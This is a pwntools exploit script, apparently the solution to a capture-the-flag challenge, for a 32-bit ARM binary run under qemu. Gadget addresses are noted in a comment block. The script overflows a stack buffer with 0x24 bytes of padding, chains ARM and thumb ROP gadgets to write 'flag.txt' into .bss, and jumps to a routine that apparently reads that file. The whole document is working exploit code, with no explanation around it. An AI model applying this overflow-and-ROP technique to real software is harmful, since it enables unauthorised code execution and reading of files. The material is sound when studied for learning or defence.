from pwn import *
context(arch="arm", os="linux", endian="little", word_size=32)

io = process(["qemu-arm", "-L",  "/usr/arm-linux-gnueabi", "-cpu", "cortex-a15", "./pwn"])
#io = process(["qemu-arm", "-L",  "/usr/arm-linux-gnueabi", "-cpu", "cortex-a15", "-g", "1234", "./pwn"])

"""
thumb mode:
0x000103e8 : str r7, [r3, #0x54] ; str r6, [r5, #0x44] ; bx r0

arm mode:
.text:000105EC 0B 00 BD E8                   POP     {R0,R1,R3}
.text:000105F0 11 FF 2F E1                   BX      R1

0x00010658 : pop {r4, r5, r6, r7, r8, sb, sl, pc}

0x00010474 : pop {r3, pc}
.text:000105C8 03 00 A0 E1                   MOV     R0, R3
.text:000105CC 00 88 BD E8                   POP     {R11,PC}


flag.txt
0x66 0x6c 0x61 0x67 0x2e 0x74 0x78 0x74
"""
bss = ELF("./pwn").bss() + 0x50

pay  = b'A'*0x24+ p32(0x10658) + b'r4r4' + p32(bss+4-0x44) + b'\x2e\x74\x78\x74' + b'\x66\x6c\x61\x67' + b'r8r8' + b'sbsb' + b'slsl' + p32(0x105ec)
#pay += p32(0x10474) + p32(0x103e8+1) + p32(bss-0x54) + p32(bss) + p32(0x105c8) + b'r111' + p32(0x000105DC)
pay += p32(0x105ec) + p32(0x103e8+1) + p32(bss-0x54) + p32(bss) + p32(0x000105DC)
io.sendlineafter(b'> ', pay)
io.interactive()
